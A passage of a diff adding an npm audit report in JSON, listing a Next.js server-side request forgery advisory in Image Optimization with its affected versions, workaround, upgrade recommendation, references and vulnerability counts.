+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-mcj8-r9mp-w47p"
+    },
+    "1241496": {
+      "findings": [
+        {
+          "version": "16.3.6",
+          "paths": [
+            "apps__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-cjq9-62q9-8jv4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-94483\n- https://github.com/vercel/next.js/commit/e002ad68bd676bb0ed0c87bb22e3590304763e0b\n- https://github.com/vercel/next.js/releases/tag/v16.3.8\n- https://github.com/advisories/GHSA-cjq9-62q9-8jv4",
+      "created": "2026-10-07T20:30:55.000Z",
+      "id": 1241496,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nAn attacker-controlled, allow-listed remote URL can lead to server-side request forgery (e.g. to private IPs) during Image Optimization. \n\n## Workaround\n\nAudit allow-listed remote URLs in `images.remotePatterns` (see https://nextjs.org/docs/app/getting-started/images#remote-images) for hosts that may not be trusted with their DNS entries. If no `images.remotePatterns` are configured, your app is not affected.",
+      "reported_by": null,
+      "title": "Next.js has Server-Side Request Forgery in Image Optimization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-94483"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=16.0.0 <16.3.8",
+      "github_advisory_id": "GHSA-cjq9-62q9-8jv4",
+      "recommendation": "Upgrade to version 16.3.8 or later",
+      "patched_versions": ">=16.3.8",
+      "updated": "2026-10-07T20:30:56.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-cjq9-62q9-8jv4"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 6,
+      "moderate": 13,
+      "high": 12,
+      "critical": 0
+    },
+    "dependencies": 1189,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1189
+  }
+}
